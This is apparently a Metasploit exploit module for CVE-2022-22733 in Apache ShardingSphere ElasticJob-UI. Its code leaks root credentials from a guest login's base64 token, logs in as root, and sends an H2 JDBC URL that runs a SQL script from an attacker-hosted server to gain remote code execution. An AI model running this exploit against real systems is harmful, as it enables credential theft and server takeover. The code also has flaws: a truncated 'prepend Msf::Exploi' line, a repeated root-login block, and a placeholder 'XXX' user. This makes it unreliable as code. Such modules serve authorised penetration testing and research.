class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache ShardingSphere ElasticJob-UI CVE-2022-22733 Exploit',
        'Description' => %q{
          Apache ShardingSphere ElasticJob-UI 3.x, including version 3.0.0, as well as prior alpha and beta versions, are
          vulnerable to CVE-2022-22733, a vulnerability that allows an attacker who has a guest account to leak sensitive information
          and perform a privilege escalation attack.

          This vulnerability occurs because, when logging into the application via a POST request to "/api/login", the server
          returns a response containing a "accessToken" field that contains a base64 encoded value. Upon decoding this value,
          an attacker can obtain the root username and password, as well as the guest username and password, in plaintext.

          By using these leaked credentials, an attacker can log into the application as the privileged "root" user, and then
          perform a privilege escalation attack by using the "/api/data-source/connectTest" endpoint to make a JDBC connection
          to an attacker controlled web server.

          By hosting a malicious SQL file on the web server, an attacker can execute arbitrary SQL statements on the
          Apache ShardingSphere ElasticJob-UI server by abusing the built in ability to create aliases in SQL that execute
          arbitrary commands. By then executing the created alias, the attacker can gain RCE as the "XXX" user.
        },
        'Author' => [
          'Zeyad Azima', # Metasploit module and research to make PoC.
          'Grant Willcox' # Tidying up on Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2022-22733'],
          ['URL', 'https://www.vicarius.io/vsociety/blog/cve-2022-22733-apache-shardingsphere-elasticjob-ui-privilege-escalation'], # Writeup part 1
          ['URL', 'https://www.vicarius.io/vsociety/blog/unique-exploit-cve-2022-22733-privilege-escalation-and-rce'], # Writeup part 2
          ['URL', 'https://y4er.com/posts/cve-2022-22733-apache-shardingsphere-elasticjob-ui-rce/'], # First known public writeup
          ['URL', 'https://github.com/apache/shardingsphere-elasticjob-ui/commit/f3afe51221cd2382e59afc4b9544c6c8a4448a99?diff=split'], # Patch in code
          ['URL', 'https://lists.apache.org/thread/qpdsm936n9bhksb0rzn6bq1h7ord2nm6'] # Vendor acknowledgement
        ],
        'DefaultOptions' => {
          'RPORT' => 8088,
          'SSL' => false,
          'DisablePayloadHandler' => true
        },
        'Platform' => ['win', 'linux'],
        'Targets' => [ [ 'Automatic', {} ] ],
        'DisclosureDate' => '2022-01-20',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [ true, 'The username to authenticate with', 'guest']),
        OptString.new('PASSWORD', [ true, 'The password to authenticate with', 'guest']),
        OptString.new('JDBC', [ true, 'Payload URL for JDBC Attack ex: http://ip:8000/poc.sql' ])
      ]
    )
  end

  def check
    res = send_request_cgi({
      'method' => 'HEAD',
      'uri' => '/api/login'
    })

    if res && res.code == 200
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  rescue ::Rex::ConnectionError
    return Exploit::CheckCode::Unknown("#{peer} - Connection failed")
  end

  def exploit
    print_status('Attempting to authenticate...')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/api/login',
      'ctype' => 'application/json',
      'data' => { 'username' => datastore['USERNAME'], 'password' => datastore['PASSWORD'] }.to_json
    })

    unless res && res.code == 200
      fail_with(Failure::NoAccess, 'Authentication failed')
    end

    json_res = JSON.parse(res.body)
    access_token = json_res['model']['accessToken']
    decoded_access_token = Base64.decode64(access_token)
    decoded_json = JSON.parse(decoded_access_token)

    root_username = decoded_json['rootUsername']
    root_password = decoded_json['rootPassword']
    print_good('Authenticated Successfully')
    print_status("Root username: #{root_username}")
    print_status("Root password: #{root_password}")

    print_status('Attempting to authenticate with root credentials...')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/api/login',
      'ctype' => 'application/json',
      'data' => { 'username' => root_username, 'password' => root_password }.to_json
    })

    unless res && res.code == 200
      fail_with(Failure::NoAccess, 'Authentication with root credentials failed')
    end

    json_res = JSON.parse(res.body)
    access_token = json_res['model']['accessToken']
    decoded_access_token = Base64.decode64(access_token)
    decoded_json = JSON.parse(decoded_access_token)

    root_username = decoded_json['rootUsername']
    root_password = decoded_json['rootPassword']

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/api/login',
      'ctype' => 'application/json',
      'data' => { 'username' => root_username, 'password' => root_password }.to_json
    })

    unless res && res.code == 200
      fail_with(Failure::NoAccess, 'Authentication with root credentials failed')
    end

    json_res = res.get_json_document
    root_access_token = json_res['model']['accessToken']
    print_good('Authenticated with root credentials successfully')
    print_status('Attempting JDBC attack...')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => '/api/data-source/connectTest',
      'ctype' => 'application/json',
      'headers' => {
        'Access-Token' => root_access_token
      },
      'data' => { 'name' => 'azima', 'driver' => 'org.h2.Driver', 'url' => "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '#{datastore['JDBC']}'", 'username' => 'a', 'password' => 'a' }.to_json
    })

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, 'JDBC attack failed')
    end

    print_good('JDBC attack successful')
  rescue JSON::ParserError
    fail_with(Failure::UnexpectedReply, 'Failed to parse the server\'s responses')
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, "#{peer} - Connection failed")
  end
end
